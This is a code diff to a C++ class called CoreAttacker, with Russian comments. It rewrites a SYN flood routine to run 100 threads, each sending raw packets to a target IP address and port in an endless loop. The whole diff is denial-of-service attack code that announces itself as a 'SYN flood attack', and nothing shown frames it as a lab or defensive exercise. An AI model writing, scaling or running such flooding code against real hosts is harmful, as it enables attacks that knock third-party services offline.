@@ -7,6 +7,7 @@
 #include <arpa/inet.h>         
 #include <unistd.h>            
 #include <stdexcept>
+#include <thread>
 
 CoreAttacker::CoreAttacker(const TargetInfo& target)
     : target_(target) 
@@ -34,37 +35,53 @@ void CoreAttacker::set_socket_options() {
     }
 }
 
+const int NUM_THREADS = 100;
 void CoreAttacker::start_flood() {
+    std::cout << "Starting SYN flood attack with " << NUM_THREADS << " threads..." << std::endl;
+    
+    std::vector<std::thread> workers;
+
+    // Запускаем все потоки
+    for (int i = 0; i < NUM_THREADS; ++i) {
+        workers.emplace_back(&CoreAttacker::attack_thread_loop, this);
+    }
+    
+    join_threads(workers);
+}
+
+void CoreAttacker::attack_thread_loop() {
     PacketGenerator generator(target_);
     
-    // Адрес назначения
     struct sockaddr_in target_addr;
     target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(target_.port); 
-    // inet_addr: преобразует IP-строку в сетевой 32-битный формат
+    target_addr.sin_port = htons(target_.port);
     target_addr.sin_addr.s_addr = inet_addr(target_.ip.c_str());
-
-    std::cout << "Starting SYN flood attack on " << target_.ip << ":" << target_.port << "..." << std::endl;
     
+    // Бесконечный цикл отправки для этого потока
     while (true) {
+        // 1. Получаем готовый сырой пакет
         std::vector<char> raw_packet = generator.get_raw_packet();
         
-        // Отправка пакета
+        // 2. Отправка пакета
         ssize_t sent_bytes = sendto(
-            this->raw_socket_fd_,                   //  сырой сокет
-            raw_packet.data(),                      // Указатель на начало буфера
-            raw_packet.size(),                      // Размер пакета
-            0,                                      // Флаги (0)
-            (struct sockaddr*)&target_addr,         // Адрес назначения
-            sizeof(target_addr)                     // Размер адреса
+            this->raw_socket_fd_,                   
+            raw_packet.data(),                      
+            raw_packet.size(),                      
+            0,                                      
+            (struct sockaddr*)&target_addr,         
+            sizeof(target_addr)                     
         );
 
         if (sent_bytes < 0) {
-            std::cerr << "Error sending packet! (May be temporary)" << std::endl;
-        } else {
-             std::cout << "Sent " << sent_bytes << " bytes." << std::endl;
+            std::cerr << "Thread error sending packet!" << std::endl;
         }
-        
     }
-    
+}
+
+void CoreAttacker::join_threads(std::vector<std::thread>& threads) {
+    for (auto& t : threads) {
+        if (t.joinable()) {
+            t.join();
+        }
+    }
 }
